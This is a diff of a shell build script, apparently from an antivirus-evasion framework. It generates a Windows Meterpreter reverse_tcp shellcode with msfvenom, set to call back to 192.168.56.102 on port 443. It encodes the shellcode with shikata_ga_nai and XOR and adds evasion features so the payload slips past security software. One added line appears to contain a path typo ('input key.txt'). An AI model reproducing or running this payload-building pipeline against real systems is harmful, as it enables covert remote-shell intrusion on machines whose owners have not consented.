@@ -18,7 +18,7 @@ LHOST=$GLOBAL_LHOST
 
 # generate payload
 #msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 3 -f c -a x86 --platform Windows > sc.txt
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.56.102 lport=443 -e x86/shikata_ga_nai -f raw -a x86 --platform Windows > input/scraw.txt
 
 # import feature construction interface
 . build/feature_construction.sh
@@ -30,10 +30,16 @@ append_value HOSTVALUE "this.that" source/evasion/evasion.include
 #add_evasion hide_console
 
 # set shellcode source
+# convert from raw to C format using the built-in tool
+./tools/shellcode_raw_to_c/shellcode_raw_to_c input/scraw.txt input/sc.txt
 set_shellcode_source static_from_file input/sc.txt
 
 # encode shellcode
-encode_shellcode xor input/sc.txt input/scenc.txt input/key.txt
+# length of generated key is 4 bytes
+encode_shellcode xor input/scraw.txt input/scenc.txt 4 input/keyraw.txt
+# convert generated key from raw to C
+# array name buf is expected by static_from_file retrieval method
+./tools/data_raw_to_c/data_raw_to_c input/keyraw.txt input key.txt buf
 
 # set key source
 set_key_source static_from_file input/key.txt
